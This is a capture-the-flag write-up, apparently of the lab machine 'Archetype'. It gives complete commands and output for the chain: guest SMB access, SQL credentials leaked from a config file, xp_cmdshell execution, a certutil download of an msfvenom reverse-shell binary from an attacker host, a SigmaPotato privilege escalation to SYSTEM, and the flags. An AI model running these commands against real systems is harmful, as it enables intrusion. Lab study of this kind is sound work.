# Archetype

First, we conduct an Nmap scan:

```
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -Pn -p- 10.129.95.187 
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2026-07-29 06:33 EDT
Nmap scan report for 10.129.95.187
Host is up (0.063s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 95.75 seconds
```

We can see an SMB server running on the host. We can try authenticating to the server anonymously using the `netexec` tool:

```
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.95.187 -u 'guest' -p ''
SMB         10.129.95.187   445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 x64 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True)
SMB         10.129.95.187   445    ARCHETYPE        [+] Archetype\guest: (Guest)
```

We can see that we successfully authenticated using anonymous login. Now we can list available shares:

```
┌──(kali㉿kali)-[~]
└─$ nxc smb 10.129.95.187 -u 'guest' -p '' --shares
SMB         10.129.95.187   445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 x64 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True)
SMB         10.129.95.187   445    ARCHETYPE        [+] Archetype\guest: (Guest)
SMB         10.129.95.187   445    ARCHETYPE        [*] Enumerated shares
SMB         10.129.95.187   445    ARCHETYPE        Share           Permissions     Remark
SMB         10.129.95.187   445    ARCHETYPE        -----           -----------     ------
SMB         10.129.95.187   445    ARCHETYPE        ADMIN$                          Remote Admin
SMB         10.129.95.187   445    ARCHETYPE        backups         READ            
SMB         10.129.95.187   445    ARCHETYPE        C$                              Default share
SMB         10.129.95.187   445    ARCHETYPE        IPC$                            Remote IPC
```

We can see an unusual "backups" share in the output. Moreover, we can see that we have READ access to this particular share. We can connect to it using anonymous login:

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.129.95.187/backups --user guest                        
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2617553 blocks available
```

We can see that there is a `prod.dtsConfig` file located on the share. We can download the file using SMB's `get` command:

```
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (3.8 KiloBytes/sec) (average 3.8 KiloBytes/sec)
smb: \> exit
```

Now we can read the file on our Kali machine:

```
┌──(kali㉿kali)-[~]
└─$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedDate="20.1.2019 10:01:34" GeneratedFromPackageID="..." GeneratedFromPackageName="..."/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>                                                                                                                                                                          
```

We can see credentials embedded in the file. We can check these credentials against an SQL Server instance running on the target host:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nxc mssql 10.129.95.187 -u 'ARCHETYPE\sql_svc' -p 'M3g4c0rp123'
MSSQL       10.129.95.187   1433   ARCHETYPE        [*] Windows 10 / Server 2019 Build 17763 (name:ARCHETYPE) (domain:Archetype)
MSSQL       10.129.95.187   1433   ARCHETYPE        [+] ARCHETYPE\sql_svc:M3g4c0rp123 (Pwn3d!)
```

We can see that they are valid, and additionally, the account has sysadmin rights in the database. We can log into the database using the `mssqlclient.py` utility:

```
┌──(kali㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 
```

Now we can proceed to gaining a reverse shell. First, we create a reverse shell binary using `msfvenom`:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.157 LPORT=4444 -f exe > revsh.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

Then we start serving the binary using Python and set up a netcat listener for the reverse shell:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ([http://0.0.0.0:80/](http://0.0.0.0:80/)) ...
```

Finally, we enable the `xp_cmdshell` function on the database server and gain RCE using this function:

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'cmd';
output                                                 
----------------------------------------------------   
Microsoft Windows [Version 10.0.17763.2061]            

(c) 2018 Microsoft Corporation. All rights reserved.   

NULL                                                   

C:\Windows\system32>                                   

SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'certutil -urlcache -split -f [http://10.10.15.157:80/revsh.exe](http://10.10.15.157:80/revsh.exe) c:\windows\temp\revsh.exe';
output                                                 
---------------------------------------------------   
****  Online  ****                                     

  0000  ...                                            

  1c00                                                 

CertUtil: -URLCache command completed successfully.   

NULL                                                   

SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'c:\windows\temp\revsh.exe';

```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.15.157] from (UNKNOWN) [10.129.95.187] 49679
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
archetype\sql_svc

C:\Windows\system32>hostname
hostname
Archetype

C:\Windows\system32>
```

After gaining the reverse shell, we can check for low-hanging fruit — for example, our privileges:

```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                             State    
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Windows\system32>
```

We can see `SeImpersonatePrivilege` in the output, which is an easily exploitable privilege that can grant us `NT AUTHORITY/SYSTEM` access. We can exploit it using the `SigmaPotato` tool:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ wget [https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe)    
--2026-07-29 09:20:18--  [https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe)
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: [https://release-assets.githubusercontent.com/github-production-release-asset/689169533/c2dab604-b778-49ae-9142-ea2e38b12908?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-07-29T14%3A15%3A50Z&rscd=attachment%3B+filename%3DSigmaPotato.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-07-29T13%3A14%3A58Z&ske=2026-07-29T14%3A15%3A50Z&sks=b&skv=2018-11-09&sig=adH4EiVYQqNAE9thSOVhdjo5wISNhUMlfCNWlmykaf8%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4NTMzMTUxOCwibmJmIjoxNzg1MzMxMjE4LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.3HHnIqORpqVtFT1kSWR9s9g9_8UrVcEGtMHEr7cU0RQ&response-content-disposition=attachment%3B%20filename%3DSigmaPotato.exe&response-content-type=application%2Foctet-stream](https://release-assets.githubusercontent.com/github-production-release-asset/689169533/c2dab604-b778-49ae-9142-ea2e38b12908?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-07-29T14%3A15%3A50Z&rscd=attachment%3B+filename%3DSigmaPotato.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-07-29T13%3A14%3A58Z&ske=2026-07-29T14%3A15%3A50Z&sks=b&skv=2018-11-09&sig=adH4EiVYQqNAE9thSOVhdjo5wISNhUMlfCNWlmykaf8%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4NTMzMTUxOCwibmJmIjoxNzg1MzMxMjE4LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.3HHnIqORpqVtFT1kSWR9s9g9_8UrVcEGtMHEr7cU0RQ&response-content-disposition=attachment%3B%20filename%3DSigmaPotato.exe&response-content-type=application%2Foctet-stream) [following]
--2026-07-29 09:20:18--  [https://release-assets.githubusercontent.com/github-production-release-asset/689169533/c2dab604-b778-49ae-9142-ea2e38b12908?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-07-29T14%3A15%3A50Z&rscd=attachment%3B+filename%3DSigmaPotato.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-07-29T13%3A14%3A58Z&ske=2026-07-29T14%3A15%3A50Z&sks=b&skv=2018-11-09&sig=adH4EiVYQqNAE9thSOVhdjo5wISNhUMlfCNWlmykaf8%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4NTMzMTUxOCwibmJmIjoxNzg1MzMxMjE4LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.3HHnIqORpqVtFT1kSWR9s9g9_8UrVcEGtMHEr7cU0RQ&response-content-disposition=attachment%3B%20filename%3DSigmaPotato.exe&response-content-type=application%2Foctet-stream](https://release-assets.githubusercontent.com/github-production-release-asset/689169533/c2dab604-b778-49ae-9142-ea2e38b12908?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-07-29T14%3A15%3A50Z&rscd=attachment%3B+filename%3DSigmaPotato.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-07-29T13%3A14%3A58Z&ske=2026-07-29T14%3A15%3A50Z&sks=b&skv=2018-11-09&sig=adH4EiVYQqNAE9thSOVhdjo5wISNhUMlfCNWlmykaf8%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4NTMzMTUxOCwibmJmIjoxNzg1MzMxMjE4LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.3HHnIqORpqVtFT1kSWR9s9g9_8UrVcEGtMHEr7cU0RQ&response-content-disposition=attachment%3B%20filename%3DSigmaPotato.exe&response-content-type=application%2Foctet-stream)
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 63488 (62K) [application/octet-stream]
Saving to: ‘SigmaPotato.exe’

SigmaPotato.exe              100%[============================================>]  62.00K  --.-KB/s    in 0.03s   

2026-07-29 09:20:18 (2.32 MB/s) - ‘SigmaPotato.exe’ saved [63488/63488]

                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ 
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ([http://0.0.0.0:80/](http://0.0.0.0:80/)) ...
10.129.95.187 - - [29/Jul/2026 09:21:51] "GET /SigmaPotato.exe HTTP/1.1" 200 -
```

```
PS C:\users\sql_svc\desktop> iwr [http://10.10.15.157/SigmaPotato.exe](http://10.10.15.157/SigmaPotato.exe) -out sigmapotato.exe
```

Now we can launch our elevated reverse shell:

```
PS C:\users\sql_svc\desktop> ./sigmapotato.exe --revshell 10.10.15.157 5555
./sigmapotato.exe --revshell 10.10.15.157 5555
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 884 | Token: 0x836 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 936
[+] Current Command Length: 10 characters
---
[+] Creating a simple PowerShell reverse shell...
[+] IP Address: 10.10.15.157 | Port: 5555
[+] Bootstrapping to an environment variable...
[+] Payload base64 encoded and set to local environment variable: '$env:SigmaBootstrap'
[+] Environment block inherited local environment variables.
[+] New Command to Execute: 'powershell -c (powershell -e $env:SigmaBootstrap)'
[+] Setting 'CREATE_UNICODE_ENVIRONMENT' process flag.
---
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 1452

[+] Process Output:
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nvlp 5555 
listening on [any] 5555 ...
connect to [10.10.15.157] from (UNKNOWN) [10.129.95.187] 49704
whoami
nt authority\system
PS C:\users\sql_svc\desktop> whoami
nt authority\system
PS C:\users\sql_svc\desktop> 
```

Finally, we can read the user flag and the root flag:

```
PS C:\users\sql_svc\desktop> cat user.txt
3e7b102e78218e935bf3f4951fec21a3
PS C:\users\sql_svc\desktop> cd /users
PS C:\users> ls


    Directory: C:\users


Mode                LastWriteTime         Length Name                                                                                                                
----                -------------         ------ ----                                                                                                                
d-----        1/19/2020  10:39 PM                Administrator                                                                                                       
d-r---        1/19/2020  10:39 PM                Public                                                                                                              
d-----        1/20/2020   5:01 AM                sql_svc                                                                                                             


PS C:\users> cd Administrator
PS C:\users\Administrator> cd Desktop
PS C:\users\Administrator\Desktop> ls


    Directory: C:\users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                                                                
----                -------------         ------ ----                                                                                                                
-ar---        2/25/2020   6:36 AM             32 root.txt                                                                                                            


PS C:\users\Administrator\Desktop> cat root.txt
b91ccec3305e98240082d4474b848528
PS C:\users\Administrator\Desktop>
```